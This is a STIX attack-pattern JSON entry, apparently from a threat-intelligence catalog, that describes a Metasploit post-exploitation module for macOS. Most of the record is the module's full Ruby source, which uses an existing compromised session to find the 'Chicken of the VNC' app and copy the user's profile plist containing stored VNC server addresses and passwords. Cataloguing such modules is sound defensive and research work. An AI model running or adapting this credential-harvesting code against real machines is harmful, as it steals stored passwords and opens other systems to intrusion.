{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--afa37b92-af2e-40a7-a22c-20c8452de935",
    "created": "2024-08-14T16:33:00.702931Z",
    "modified": "2024-08-14T16:33:00.702935Z",
    "name": "OS X Gather Chicken of the VNC Profile",
    "description": " This module will download the \"Chicken of the VNC\" client application's profile file,\twhich is used to store other VNC servers' information such as the IP and password.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/enum_chicken_vnc_profile.rb",
            "external_id": "enum_chicken_vnc_profile.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Gather Chicken of the VNC Profile',\n        'Description' => %q{\n          This module will download the \"Chicken of the VNC\" client application's\n          profile file,\twhich is used to store other VNC servers' information such\n          as the IP and password.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ]\n      )\n    )\n  end\n\n  def whoami\n    exec('/usr/bin/whoami')\n  end\n\n  #\n  # This is just a wrapper for cmd_exec(), except it chomp() the output,\n  # and retry under certain conditions.\n  #\n  def exec(cmd)\n    tries = 0\n    begin\n      out = cmd_exec(cmd).chomp\n    rescue ::Timeout::Error => e\n      tries += 1\n      if tries < 3\n        vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n        retry\n      end\n    rescue EOFError => e\n      tries += 1\n      if tries < 3\n        vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n        retry\n      end\n    end\n  end\n\n  def dir(path)\n    subdirs = exec(\"ls -l #{path}\")\n    return [] if subdirs =~ /No such file or directory/\n\n    items = subdirs.scan(/[A-Z][a-z][a-z]\\x20+\\d+\\x20[\\d:]+\\x20(.+)$/).flatten\n    return items\n  end\n\n  def locate_chicken\n    dir('/Applications/').each do |folder|\n      m = folder.match(/Chicken of the VNC\\.app/)\n      return true\n    end\n\n    return false\n  end\n\n  def get_profile_plist(user)\n    f = exec(\"cat /Users/#{user}/Library/Preferences/com.geekspiff.chickenofthevnc.plist\")\n    if f =~ /No such file or directory/\n      return nil\n    else\n      return f\n    end\n  end\n\n  def save(file)\n    p = store_loot(\n      'chickenvnc.profile',\n      'bin',\n      session,\n      file,\n      'com.geekspiff.chickenofthevnc.plist'\n    )\n\n    print_good(\"#{@peer} - plist saved in #{p}\")\n  end\n\n  def run\n    @peer = \"#{session.session_host}:#{session.session_port}\"\n    user = whoami\n\n    if !locate_chicken\n      print_error(\"#{@peer} - Chicken of the VNC is not installed\")\n      return\n    else\n      print_status(\"#{@peer} - Chicken of the VNC found\")\n    end\n\n    plist = get_profile_plist(user)\n    if plist.nil?\n      print_error('No profile plist found')\n    elsif !plist.nil?\n      save(plist)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}